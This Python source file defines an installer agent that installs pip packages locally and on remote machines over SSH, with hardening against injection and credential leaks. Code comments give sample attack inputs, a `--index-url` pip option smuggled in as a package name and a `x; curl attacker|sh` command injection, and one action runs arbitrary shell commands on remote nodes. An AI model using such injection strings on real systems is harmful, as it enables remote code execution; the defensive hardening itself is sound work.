"""InstallerAgent — pre-defined agent that installs Python packages on demand.
Always uses sys.executable so packages land in the active venv (e.g. myenv),
not the system Python.
"""

import asyncio
import importlib
import logging
import re
import shlex
import socket
import sys
import time
from pathlib import Path
from typing import Any

import asyncssh

from ..config import (
    CONFIG,
    DeployTarget,
    deploy_env_prefix,
    deploy_name_error,
    deploy_target,
    deploy_target_for_host,
)
from ..core.actor import Actor, Message, MessageType
from ..core.paths import resolve_state_dir

logger = logging.getLogger(__name__)


# pip package name → importable module name
#: What a package name may look like. PEP 508 names are letters, digits, and
#: `-`/`_`/`.` as internal separators; a version specifier or extras may follow.
#: Nothing else — no path, no URL, no whitespace, and no leading `-`.
_PACKAGE_NAME = re.compile(
    # Name: never a leading dash, which is what makes an option an option.
    r"[A-Za-z0-9][A-Za-z0-9._-]*"
    # Optional extras: package[extra,extra]
    r"(?:\[[A-Za-z0-9,._-]+\])?"
    # Optional version specifiers, comma-separated: >=1.2,<2. No spaces — a
    # space would let a second argument ride along inside one list element.
    r"(?:"
    r"(?:[=<>!~]=|[<>])[A-Za-z0-9._*+!-]+"
    r"(?:,(?:[=<>!~]=|[<>])[A-Za-z0-9._*+!-]+)*"
    r")?"
)


def is_installable_name(package: str) -> bool:
    """Whether `package` is a package name and not an instruction to pip.

    Two different exposures, one answer.

    Locally the command is built as a *list*, so there is no shell — but pip
    reads its own options from positional arguments, so `--index-url=http://…`
    or a bare URL is honoured as configuration rather than treated as a name.
    That is fetch-and-execute from an attacker-chosen index with no shell
    involved, and it arrives in a spawn config an LLM wrote.

    Remotely the same list is joined into a string and sent over SSH, so there
    the value is also shell syntax — `;`, backticks, `$(…)`. `shlex.quote`
    handles that half; this handles the half quoting cannot, because a properly
    quoted `--index-url` is still an option.

    An allow-list rather than a deny-list: the set of legitimate names is small
    and describable, and the set of harmful strings is not.
    """
    candidate = (package or "").strip()
    return bool(candidate) and _PACKAGE_NAME.fullmatch(candidate) is not None


PACKAGE_TO_IMPORT = {
    "opencv-python": "cv2",
    "pillow": "PIL",
    "scikit-learn": "sklearn",
    "beautifulsoup4": "bs4",
    "pymupdf": "fitz",
    "python-docx": "docx",
    "python-pptx": "pptx",
    "pdfplumber": "pdfplumber",
    "httpx": "httpx",
    "requests": "requests",
    "numpy": "numpy",
    "pandas": "pandas",
    "torch": "torch",
    "transformers": "transformers",
    "ultralytics": "ultralytics",
    "pyserial": "serial",
    "duckduckgo-search": "duckduckgo_search",
    "ddgs": "duckduckgo_search",
    "asyncssh": "asyncssh",
    "rich": "rich",
    "tqdm": "tqdm",
    "lxml": "lxml",
    "aiohttp": "aiohttp",
}

# importable module name → pip package name (for when user gives import names)
IMPORT_TO_PACKAGE = {
    "cv2": "opencv-python",
    "PIL": "pillow",
    "sklearn": "scikit-learn",
    "bs4": "beautifulsoup4",
    "fitz": "pymupdf",
    "docx": "python-docx",
    "pptx": "python-pptx",
    "pdfplumber": "pdfplumber",
    "httpx": "httpx",
    "requests": "requests",
    "numpy": "numpy",
    "pandas": "pandas",
    "torch": "torch",
    "transformers": "transformers",
    "ultralytics": "ultralytics",
    "serial": "pyserial",
    "duckduckgo_search": "duckduckgo-search",
    "ddgs": "duckduckgo-search",
    "asyncssh": "asyncssh",
    "rich": "rich",
    "tqdm": "tqdm",
    "lxml": "lxml",
    "aiohttp": "aiohttp",
}


class InstallerAgent(Actor):
    """Pre-defined agent that installs Python packages on demand.
    Uses sys.executable so packages are installed into the active venv.
    """

    def __init__(self, **kwargs):
        kwargs.setdefault("name", "installer")
        super().__init__(**kwargs)
        self.protected = True
        self._install_log: list[dict] = []
        # Serialises the read-then-append on the known-hosts file: two deploys
        # to new hosts at once would otherwise both read "unknown" and race.
        self._known_hosts_lock = asyncio.Lock()

    def _current_task_description(self) -> str:
        return "idle"

    async def on_start(self):
        logger.info(f"[{self.name}] Installer ready — using: {sys.executable}")
        self._scrub_persisted_credentials()
        await self._mqtt_publish(
            f"agents/{self.actor_id}/logs",
            {
                "type": "log",
                "message": f"Installer ready ({sys.executable})",
                "timestamp": time.time(),
            },
        )
        await self.publish_manifest(
            description="Installs Python packages on demand via pip",
            capabilities=["pip_install", "package_management"],
        )

    async def handle_message(self, msg: Message):
        if msg.type == MessageType.TASK:
            result = await self._handle_install(msg)
            # Echo task_id back so caller's future can resolve
            if isinstance(msg.payload, dict):
                task_id = msg.payload.get("task") or msg.payload.get("_task_id")
                if task_id:
                    result["task"] = task_id
                    result["_task_id"] = task_id
            target = msg.reply_to or msg.sender_id
            if target:
                await self.send(target, MessageType.RESULT, result)

    async def _handle_install(self, msg: Message) -> dict:
        payload = msg.payload if isinstance(msg.payload, dict) else {}
        action = payload.get("action", "install")

        if action == "install":
            packages = payload.get("packages", [])
            if isinstance(packages, str):
                packages = [p.strip() for p in packages.replace(",", " ").split()]
            return await self._install_packages(packages)

        if action == "check":
            packages = payload.get("packages", [])
            if isinstance(packages, str):
                packages = [p.strip() for p in packages.replace(",", " ").split()]
            return self._check_packages(packages)

        if action == "resolve":
            return self._resolve_imports(payload.get("imports", []))

        if action == "history":
            return {"history": self._install_log[-20:]}

        if action == "node_install":
            # Install packages on a remote node via SSH
            # payload: {host, packages}; SSH auth comes from the deploy target
            return await self._node_install(payload)

        if action == "node_deploy":
            # Full bootstrap: copy remote_runner.py + install deps + start runner
            # payload: {host, node_name, broker}; SSH auth comes from the deploy target
            return await self._node_deploy(payload)

        if action == "node_install_for_agent":
            # Install packages needed by a specific agent on its remote node
            # payload: {host, packages, agent_name}; SSH auth comes from the deploy target
            return await self._node_install(payload)

        if action == "node_run":
            # Run an arbitrary command on a remote node via SSH
            # payload: {host, command}; SSH auth comes from the deploy target
            return await self._node_run(payload)

        return {"error": f"Unknown action: {action}"}

    # ── Core install logic ──────────────────────────────────────────────────

    async def _install_packages(self, packages: list[str]) -> dict:
        if not packages:
            return {"error": "No packages specified"}

        results = {}
        failed = []

        for pkg in packages:
            pkg = pkg.strip()
            if not pkg:
                continue

            # Resolve import name → pip name (e.g. "cv2" → "opencv-python")
            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)

            # No shell here — the command is a list — but pip reads its own
            # options from positional arguments, so `--index-url=http://…` is
            # honoured as configuration rather than treated as a name.
            if not is_installable_name(pip_name):
                logger.warning("[%s] Refusing to install %r — not a package name", self.name, pkg)
                results[pkg] = "refused"
                failed.append(pkg)
                continue

            # Check if already importable (invalidate cache so fresh installs show up)
            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
            if self._is_installed(import_name):
                logger.info(f"[{self.name}] {pip_name} already installed.")
                results[pip_name] = "already_installed"
                continue

            logger.info(f"[{self.name}] Installing {pip_name} into {sys.executable}...")
            await self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": f"Installing {pip_name}...", "timestamp": time.time()},
            )

            success, output = await self._pip_install(pip_name)

            # duckduckgo-search was renamed to ddgs in v9 — try the other name as fallback
            if not success and pip_name in ("duckduckgo-search", "ddgs"):
                alt = "ddgs" if pip_name == "duckduckgo-search" else "duckduckgo-search"
                logger.info(f"[{self.name}] Trying alternative name: {alt}")
                success, output = await self._pip_install(alt)
                if success:
                    pip_name = alt

            # pdfplumber sometimes fails on Windows — try pymupdf (fitz) as fallback
            if not success and pip_name == "pdfplumber":
                logger.info(f"[{self.name}] pdfplumber failed, trying pymupdf as fallback...")
                success, output = await self._pip_install("pymupdf")
                if success:
                    pip_name = "pymupdf"

            results[pip_name] = "installed" if success else f"failed: {output[-300:]}"
            if not success:
                failed.append(pip_name)

            self._install_log.append(
                {
                    "package": pip_name,
                    "success": success,
                    "timestamp": time.time(),
                    "output": output[-500:],
                }
            )

            if success:
                status = f"✓ {pip_name} installed"
            else:
                # Show the actual pip error so failures are diagnosable
                err_snippet = output[-400:].strip().replace("\n", " | ")
                status = f"✗ {pip_name} FAILED: {err_snippet}"
            logger.info(f"[{self.name}] {status}")
            await self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": status, "timestamp": time.time()},
            )

        return {
            "results": results,
            "failed": failed,
            "success": len(failed) == 0,
            "message": f"Installed {len(results) - len(failed)}/{len(results)} packages",
        }

    async def _pip_install(self, package: str) -> tuple[bool, str]:
        """Run pip install using the same interpreter that launched this process.

        sys.executable inside a venv points to  venv/Scripts/python.exe  (Windows)
        or  venv/bin/python  (Linux/Mac), so packages always land in the right place.

        Uses subprocess.run() in a thread executor instead of asyncio.create_subprocess_exec()
        because asyncio subprocesses are unreliable on Windows with SelectorEventLoop
        (the default in some Python versions / environments). subprocess.run() works
        correctly on all platforms.
        """
        import subprocess

        cmd = [sys.executable, "-m", "pip", "install", package, "--quiet"]
        if sys.platform != "win32":
            cmd.append("--break-system-packages")

        def _run_pip() -> tuple[bool, str]:
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=180,
                )
                output = (result.stdout + result.stderr).decode("utf-8", errors="replace")
                return result.returncode == 0, output
            except subprocess.TimeoutExpired:
                return False, "pip timed out after 180s"
            except FileNotFoundError:
                return False, f"Python executable not found: {sys.executable}"
            except Exception as e:
                return False, f"{type(e).__name__}: {e}"

        try:
            loop = asyncio.get_event_loop()
            success, output = await loop.run_in_executor(None, _run_pip)

            if success:
                # Refresh import machinery so the new package is visible immediately
                importlib.invalidate_caches()

            return success, output

        except Exception as e:
            return False, f"Executor error: {type(e).__name__}: {e}"

    def _is_installed(self, import_name: str) -> bool:
        """Check importability, always refreshing the import cache first."""
        importlib.invalidate_caches()
        try:
            importlib.import_module(import_name)
            return True
        except ImportError:
            return False

    # ── Helper actions ──────────────────────────────────────────────────────

    def _check_packages(self, packages: list[str]) -> dict:
        status = {}
        for pkg in packages:
            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)
            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
            status[pkg] = "installed" if self._is_installed(import_name) else "missing"
        return {"status": status}

    def _resolve_imports(self, imports: list[str]) -> dict:
        return {"resolved": {imp: IMPORT_TO_PACKAGE.get(imp, imp) for imp in imports}}

    # ── Remote node helpers (SSH via asyncssh) ──────────────────────────────

    def _resolve_ssh_target(self, payload: dict) -> DeployTarget | None:
        """The configured deploy target a payload refers to, by node name or host.

        ``node_install`` and ``node_run`` are handed a host rather than a node
        name, so a host match is the fallback — otherwise every follow-up call
        to an already-deployed node would have to repeat its credentials.
        """
        node_name = payload.get("node_name") or payload.get("node")
        target = deploy_target(str(node_name)) if node_name else None
        if target is None:
            target = deploy_target_for_host(str(payload.get("host") or ""))
        return target

    async def _resolve_target_host(self, target: DeployTarget, requested: str) -> str:
        """The address to connect to — the target's, never the payload's.

        Resolving credentials from configuration is not enough on its own: a
        payload that names a configured node but a *different* host would have
        sent that node's password to a machine of the caller's choosing. The
        configured host wins, and a payload that disagrees is refused rather
        than quietly ignored, because a mismatch means the caller believed it
        was talking to somewhere else.

        A target with no host is the deliberate "find it by name" case, and the
        lookup happens here rather than being taken on trust from the payload —
        a single mDNS query for one host, resolved by the component that is
        about to authenticate to it.
        """
        if target.host:
            if requested and requested.strip().lower() != target.host.strip().lower():
                raise PermissionError(
                    f"Refusing to connect: deploy target '{target.name}' is configured "
                    f"as {target.host}, but the task asked for {requested}. Credentials "
                    f"are bound to the configured host."
                )
            return target.host

        mdns = f"{target.name}.local"
        try:
            return await asyncio.to_thread(socket.gethostbyname, mdns)
        except OSError as exc:
            raise PermissionError(
                f"Deploy target '{target.name}' has no host configured and "
                f"'{mdns}' does not resolve. Set {deploy_env_prefix(target.name)}_HOST."
            ) from exc

    def _known_hosts_path(self) -> Path:
        """Where learned SSH host keys live.

        Follows ``WACTORZ_STATE_DIR`` unless ``DEPLOY_KNOWN_HOSTS`` pins it, so
        the add-on's ``/data/state`` keeps them across updates — a known-hosts
        file that resets on every restart cannot detect a key change.
        """
        configured = CONFIG.deploy_known_hosts
        if configured:
            return Path(configured).expanduser()
        return Path(resolve_state_dir()) / "known_hosts"

    async def _known_hosts(self, host: str, port: int) -> str:
        """Return the known-hosts path to verify ``host`` against, learning its key first.

        Every SSH connection used to pass ``known_hosts=None``, which accepts
        whatever key answers — so anything that could win the race for the
        target's address on a LAN collected the SSH credentials.

        Verification is now on. A host we have never seen has its key fetched
        (``get_server_host_key`` does not authenticate, so no credential is at
        risk) and recorded — trust on first use, as ssh(1) does interactively. A
        host we *have* seen is never re-learned: the entry already there is what
        asyncssh checks against, so a changed key fails the connection, which is
        the case worth failing on. ``DEPLOY_STRICT_HOST_KEYS=1`` drops the
        first-use step and requires the entry to be there already.
        """
        path = self._known_hosts_path()
        async with self._known_hosts_lock:
            try:
                known = asyncssh.match_known_hosts(str(path), host, host, port)[0]
            except FileNotFoundError:
                known = []
            if known:
                return str(path)

            if CONFIG.deploy_strict_host_keys:
                raise PermissionError(
                    f"Host key for {host}:{port} is not in {path} and "
                    f"DEPLOY_STRICT_HOST_KEYS is set. Add the key with "
                    f"`ssh-keyscan -p {port} {host} >> {path}` after verifying it."
                )

            key = await asyncssh.get_server_host_key(host, port)
            if key is None:
                raise PermissionError(f"{host}:{port} offered no SSH host key.")
            entry = host if port == 22 else f"[{host}]:{port}"
            line = f"{entry} {key.export_public_key('openssh').decode().strip()}\n"
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "a", encoding="utf-8") as fh:
                fh.write(line)
            # 0600: the file is the only record of which key we trust, so a
            # writable-by-others copy would undo the check it exists to make.
            path.chmod(0o600)
            self._log_remote(
                f"Learned SSH host key for {entry} ({key.get_fingerprint()}) — recorded in {path}"
            )
            return str(path)

    async def _put_broker_env(self, sftp: Any, target: DeployTarget, user: str) -> bool:
        """Write the node's broker credentials to ``~/wactorz/.env``, mode 0600.

        Returns whether anything was written — nothing is when the broker takes
        anonymous connections, and writing an empty file would then leave the
        runner exporting two blank variables over a working setup.

        A node's own ``DEPLOY_<NODE>_BROKER_USER``/``_PASSWORD`` win; otherwise
        it gets the server's. That default is the usable one — a single broker
        with one account is the common deployment — but it does mean **a stolen
        edge device holds full broker access**, and the broker carries the code
        spawned agents run. Per-node accounts are the answer when that matters;
        ``password_file`` holds as many users as you like.

        This is the out-of-band channel the broker credentials must travel by:
        sending them over the broker itself would publish the very secret that
        protects it, to a channel that is unauthenticated until they arrive.
        """
        username = target.broker_user or CONFIG.mqtt_username
        password = target.broker_password or CONFIG.mqtt_password
        if not username and not password:
            return False

        body = f"MQTT_USERNAME={shlex.quote(username)}\nMQTT_PASSWORD={shlex.quote(password)}\n"
        remote = f"/home/{user}/wactorz/.env"
        async with sftp.open(remote, "w") as handle:
            await handle.write(body)
        # After writing, not before: SFTP creates with the umask, so there is a
        # window either way, but a file that is never widened is better than one
        # created world-readable and tightened later.
        await sftp.chmod(remote, 0o600)
        return True

    async def _ssh_kwargs(self, payload: dict) -> dict:
        """Build asyncssh connection kwargs for a task payload.

        Credentials come from the configured deploy target and from nowhere
        else. They used to be read out of the payload — which is message data,
        so a chat line or an LLM-authored task could name a host and hand it a
        password — and, failing that, out of ``_node_credentials`` in the
        agent's persisted state, where the password sat in plaintext.
        """
        requested = str(payload.get("host") or "")
        target = self._resolve_ssh_target(payload)
        if target is None:
            raise PermissionError(
                f"No deploy target configured for '{requested}'. "
                f"SSH credentials come from the environment (DEPLOY_TARGETS plus a "
                f"DEPLOY_<NODE>_* block), not from the task payload."
            )
        host = await self._resolve_target_host(target, requested)
        if not target.key_path and not target.password:
            raise PermissionError(
                f"Deploy target '{target.name}' has no credentials. Set "
                f"{deploy_env_prefix(target.name)}_KEY (preferred) or "
                f"{deploy_env_prefix(target.name)}_PASSWORD."
            )

        kwargs: dict = {
            "host": host,
            "port": target.ssh_port,
            "username": target.user,
            "known_hosts": await self._known_hosts(host, target.ssh_port),
        }
        if target.key_path:
            kwargs["client_keys"] = [target.key_path]
        if target.password:
            kwargs["password"] = target.password
        return kwargs

    def _persist_node_info(self, node_name: str, host: str, user: str) -> None:
        """Remember where a deployed node lives — host and user, never a secret.

        This used to store the SSH password alongside them so later connections
        could reuse it, which put a live credential into the kv store (and into
        every backup and reset dump of it). Credentials are resolved from the
        environment at connect time instead, so there is nothing here worth
        stealing.
        """
        nodes = self.recall("_node_credentials") or {}
        nodes[node_name] = {"host": host, "user": user}
        self.persist("_node_credentials", nodes)
        # Kept for backward compat with _spawn_remote's lookups.
        self.persist(f"node_host_{node_name}", host)
        self.persist(f"node_user_{node_name}", user)
        logger.info(f"[{self.name}] Recorded node '{node_name}' at {user}@{host}")

    def _scrub_persisted_credentials(self) -> None:
        """Drop passwords and key paths written by earlier versions.

        Upgrading is what removes the secret: nothing reads these fields any
        more, so leaving them would keep a plaintext password in the kv store
        for the life of the install.
        """
        nodes = self.recall("_node_credentials") or {}
        cleaned = {
            name: {"host": rec.get("host", ""), "user": rec.get("user", "pi")}
            for name, rec in nodes.items()
            if isinstance(rec, dict)
        }
        if cleaned != nodes:
            self.persist("_node_credentials", cleaned)
            logger.info(
                f"[{self.name}] Removed stored SSH credentials for "
                f"{len(cleaned)} node(s) — credentials now come from the environment"
            )

    async def _ssh_run(self, conn, command: str) -> tuple[bool, str]:
        """Run a single command over an open SSH connection. Returns (ok, output)."""
        result = await conn.run(command, check=False)
        output = (result.stdout or "") + (result.stderr or "")
        return result.exit_status == 0, output.strip()

    def _log_remote(self, message: str):
        logger.info(f"[{self.name}] {message}")
        asyncio.create_task(
            self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": message, "timestamp": time.time()},
            )
        )

    async def _node_install(self, payload: dict) -> dict:
        """Install pip packages on a remote node via SSH.

        payload keys:
          host      — IP or hostname of the remote machine
          packages  — list of package names to install

        SSH auth is not a payload key — see _ssh_kwargs.
        """
        host = payload.get("host")
        packages = payload.get("packages", [])
        if isinstance(packages, str):
            packages = [p.strip() for p in packages.replace(",", " ").split()]
        if not host:
            return {"error": "Missing 'host' in payload"}
        if not packages:
            return {"error": "No packages specified"}

        refused = [p for p in packages if not is_installable_name(p)]
        if refused:
            # Refused rather than filtered: installing a subset silently would
            # report success for a request that was not carried out.
            return {"error": f"Not package names: {', '.join(refused)}"}

        # Two guards, because neither covers the other. `shlex.quote` stops
        # the value being read as *shell* syntax once this string reaches SSH;
        # the allow-list above stops it being read as *pip options*, which a
        # correctly quoted `--index-url=…` still would be.
        pkg_str = " ".join(shlex.quote(p) for p in packages)
        self._log_remote(f"Installing {pkg_str} on {host}...")

        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                # Detect the right pip to use:
                # 1. Venv at ~/wactorz/venv (created by node_deploy) — always prefer this
                # 2. Fall back to python3 -m pip with --break-system-packages
                ok, venv_check = await self._ssh_run(
                    conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
                )
                if venv_check.strip() == "yes":
                    pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
                    self._log_remote("Using venv pip at ~/wactorz/venv/bin/pip")
                else:
                    # No venv — try to create one first
                    self._log_remote("No venv found — creating ~/wactorz/venv first...")
                    await self._ssh_run(
                        conn, "mkdir -p ~/wactorz && python3 -m venv ~/wactorz/venv"
                    )
                    ok, venv_check2 = await self._ssh_run(
                        conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
                    )
                    if venv_check2.strip() == "yes":
                        pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
                        self._log_remote("Venv created successfully")
                    else:
                        pip_cmd = (
                            f"python3 -m pip install {pkg_str} --break-system-packages -q 2>&1"
                        )
                        self._log_remote("Venv creation failed — falling back to system pip")

                ok, output = await self._ssh_run(conn, pip_cmd)
                if ok:
                    self._log_remote(f"✓ {pkg_str} installed on {host}")
                    return {
                        "success": True,
                        "host": host,
                        "packages": packages,
                        "output": output[-300:],
                    }
                self._log_remote(f"✗ Install failed on {host}: {output[-200:]}")
                return {"success": False, "host": host, "error": output[-400:]}

        except Exception as e:
            return {"success": False, "host": host, "error": str(e)}

    async def _node_deploy(self, payload: dict) -> dict:
        """Full bootstrap of a new Wactorz edge node via SSH.

        Steps:
          1. Create ~/wactorz/ directory
          2. Upload remote_runner.py
          3. Install aiomqtt (the only runtime dependency)
          4. Kill any existing runner with the same node name
          5. Start the runner in the background
          6. Verify it appears online within 15 seconds

        payload keys:
          host       — IP or hostname
          node_name  — name this node will use (default: "remote-node")
          broker     — MQTT broker host reachable FROM the Pi (default: "localhost")
          port       — MQTT broker port (default: 1883)

        SSH auth is not a payload key: the user and credentials come from the
        node's configured deploy target (see _ssh_kwargs).
        """
        requested_host = payload.get("host")
        node_name = payload.get("node_name", "remote-node")
        broker = payload.get("broker", "localhost")
        mqtt_port = payload.get("port", 1883)

        # Before anything reaches the network: a name that cannot be an MQTT
        # topic level yields a runner the broker refuses on every operation,
        # so it would retry forever while this deploy reported success.
        name_problem = deploy_name_error(str(node_name))
        if name_problem:
            self._log_remote(f"Refusing deploy: {name_problem}")
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": name_problem,
            }

        target = self._resolve_ssh_target(payload)
        if target is None:
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": (
                    f"No deploy target configured for '{node_name}' ({requested_host}). "
                    f"Set DEPLOY_TARGETS and the {deploy_env_prefix(node_name)}_* block."
                ),
            }
        try:
            host = await self._resolve_target_host(target, str(requested_host or ""))
        except PermissionError as exc:
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": str(exc),
            }
        # The target's user is authoritative — the remote paths below are built
        # from it, so taking it from the payload would let a caller write the
        # runner into a different account than the one it authenticates as.
        user = target.user

        # Find remote_runner.py relative to this file
        import pathlib

        candidates = [
            pathlib.Path(__file__).parent.parent / "remote_runner.py",
            pathlib.Path("remote_runner.py"),
            pathlib.Path(__file__).parent.parent.parent / "remote_runner.py",
        ]
        runner_path = next((p for p in candidates if p.exists()), None)
        if not runner_path:
            return {"error": "remote_runner.py not found. Make sure it is in the wactorz root."}

        self._log_remote(f"Deploying node '{node_name}' to {user}@{host}...")

        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                # 1. Create directory
                await self._ssh_run(conn, "mkdir -p ~/wactorz")
                self._log_remote(f"[{node_name}] Directory created.")

                # 2. Upload remote_runner.py and, if the broker needs them, the
                # credentials it will read from its environment.
                async with conn.start_sftp_client() as sftp:
                    await sftp.put(str(runner_path), f"/home/{user}/wactorz/remote_runner.py")
                    env_written = await self._put_broker_env(sftp, target, user)
                self._log_remote(f"[{node_name}] remote_runner.py uploaded.")
                if env_written:
                    self._log_remote(f"[{node_name}] Broker credentials written to ~/wactorz/.env.")

                # 3. Create venv if it doesn't exist — avoids all --break-system-packages issues
                ok, out = await self._ssh_run(
                    conn,
                    "test -d ~/wactorz/venv && echo exists || python3 -m venv ~/wactorz/venv && echo created",
                )
                self._log_remote(f"[{node_name}] venv: {out.strip()}")

                # 4. Install aiomqtt into the venv
                ok, out = await self._ssh_run(
                    conn, "~/wactorz/venv/bin/pip install aiomqtt psutil -q 2>&1"
                )
                if not ok:
                    self._log_remote(f"[{node_name}] pip install warning: {out[:150]}")
                else:
                    self._log_remote(f"[{node_name}] aiomqtt installed into venv.")

                # 5. Kill any existing instance with this node name.
                # The pattern is quoted as one argument rather than wrapped in
                # literal quotes: a name containing a quote would otherwise end
                # them and the rest would be read as more shell.
                pattern = f"remote_runner.py.*--name {node_name}"
                await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")

                # 6. Start runner using venv python in the background
                # Every interpolated value is quoted. `broker` comes straight
                # off the task payload with no validation, so `--broker` used to
                # accept `x; curl attacker|sh` and run it on the node. `node_name`
                # is checked by `deploy_name_error`, but that only forbids the
                # MQTT topic characters `# + /` — a space, a `;` or a `$(…)` is a
                # perfectly acceptable node name as far as it is concerned.
                # `~` is left outside the quotes so the remote shell still
                # expands it.
                log_path = shlex.quote(f"{node_name}.log")
                # Sourced, never passed. Putting MQTT_PASSWORD=… in front of the
                # command would keep it out of the *runner's* argv, but SSH exec
                # runs `$SHELL -c '<the whole string>'`, and that wrapper's argv
                # is readable by any local user with `ps` for as long as the
                # launch takes. Sourcing a 0600 file puts it in no argv at all.
                launch_env = "set -a; . ~/wactorz/.env; set +a; " if env_written else ""
                cmd = (
                    f"{launch_env}"
                    f"nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
                    f"--broker {shlex.quote(str(broker))} "
                    f"--port {shlex.quote(str(mqtt_port))} "
                    f"--name {shlex.quote(node_name)} "
                    f"> ~/wactorz/{log_path} 2>&1 &"
                )
                await self._ssh_run(conn, cmd)
                self._log_remote(f"[{node_name}] Runner started with venv python.")

            self._log_remote(
                f"[{node_name}] Deploy complete! Node will appear in /nodes within 15s."
            )
            # Record where the node lives; credentials stay in the environment.
            self._persist_node_info(node_name=node_name, host=host, user=user)
            return {
                "success": True,
                "node_name": node_name,
                "host": host,
                "broker": broker,
                "message": (
                    f"Node '{node_name}' deployed to {user}@{host}. "
                    f"It will appear in /nodes within ~15 seconds."
                ),
            }

        except Exception as e:
            msg = f"Deploy failed for '{node_name}' on {host}: {e}"
            self._log_remote(msg)
            return {"success": False, "node_name": node_name, "host": host, "error": str(e)}

    async def _node_run(self, payload: dict) -> dict:
        """Run an arbitrary shell command on a remote node via SSH.

        payload keys:
          host     — IP or hostname
          command  — shell command to run

        SSH auth is not a payload key — see _ssh_kwargs.
        """
        host = payload.get("host")
        command = payload.get("command", "echo hello")
        if not host:
            return {"error": "Missing 'host' in payload"}

        self._log_remote(f"Running on {host}: {command[:80]}")
        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                ok, output = await self._ssh_run(conn, command)
                return {
                    "success": ok,
                    "host": host,
                    "command": command,
                    "output": output,
                    "exit_code": 0 if ok else 1,
                }
        except Exception as e:
            return {"success": False, "host": host, "error": str(e)}
